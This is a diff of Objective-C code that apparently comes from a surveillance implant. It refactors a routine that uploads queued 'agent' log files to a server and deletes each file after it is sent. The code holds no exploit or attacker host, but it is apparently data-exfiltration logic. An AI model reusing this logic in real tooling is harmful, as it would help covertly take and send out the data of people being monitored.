@@ -202,11 +202,11 @@
 #endif
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
+  id anObject;
+  
   RCSILogManager *logManager = [RCSILogManager sharedInstance];
-  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
-  
-  [taskManager suspendAgents];
-  
+
   //
   // Logs to the send queue
   //
@@ -222,63 +222,42 @@
       errorLog(@"An error occurred while closing active logs (non-fatal)");
 #endif
     }
+
+  int logCount = [logManager getSendLogItemCount];
   
-  [taskManager restartAgents];
+  NSMutableIndexSet *sendedItem  = [NSMutableIndexSet indexSet];
   
-  NSEnumerator *enumerator = [logManager getSendQueueEnumerator];
-  id anObject;
-  
-  if (enumerator == nil)
+  //
+  // Send all the logs in the send queue
+  //
+  for (int i=0; i < logCount; i++)
     {
-#ifdef DEBUG_LOG_NOP
-      warnLog(@"No logs in queue, searching on local folder");
-#endif
-    }
-  else
-    {
-      //
-      // Send all the logs in the send queue
-      //
-      while (anObject = [enumerator nextObject])
+      anObject = [logManager getSendLogItemAtIndex:i];
+      
+      if (anObject == nil)
+        continue;
+        
+      NSString *logName = [anObject objectForKey: @"logName"];
+
+      if ([[NSFileManager defaultManager] fileExistsAtPath: logName] == TRUE)
         {
-          [anObject retain];
-          NSString *logName = [[anObject objectForKey: @"logName"] copy];
-          
-#ifdef DEBUG_LOG_NOP
-          infoLog(@"Sending log: %@", logName);
-#endif
-          
-          if ([[NSFileManager defaultManager] fileExistsAtPath: logName] == TRUE)
+          NSData *logContent  = [NSData dataWithContentsOfFile: logName];
+
+          if ([self _sendLogContent: logContent] == YES)
             {
-              NSData *logContent  = [NSData dataWithContentsOfFile: logName];
-              
-              //
-              // Send log
-              //
-              [self _sendLogContent: logContent];
-              
-              NSString *logPath = [[anObject objectForKey: @"logName"] retain];
-              
-              if ([[NSFileManager defaultManager] removeItemAtPath: logPath
-                                                             error: nil] == NO)
+              [sendedItem addIndex:i];
+              if ([[NSFileManager defaultManager] removeItemAtPath: logName
+                                                         error: nil] == NO)
                 {
 #ifdef DEBUG_LOG_NOP
-                  errorLog(@"Error while removing (%@) from fs", logPath);
+                errorLog(@"Error while removing (%@) from fs", logName);
 #endif
                 }
-              
-              [logPath release];
             }
-            
-          [logName release];
-          
-          //
-          // Remove log entry from the send queue
-          //
-          [logManager removeSendLog: [[anObject objectForKey: @"agentID"] intValue]
-                          withLogID: [[anObject objectForKey: @"logID"] intValue]];
         }
     }
+  
+  [logManager clearSendLogQueue: sendedItem];
   
   [outerPool release];
   
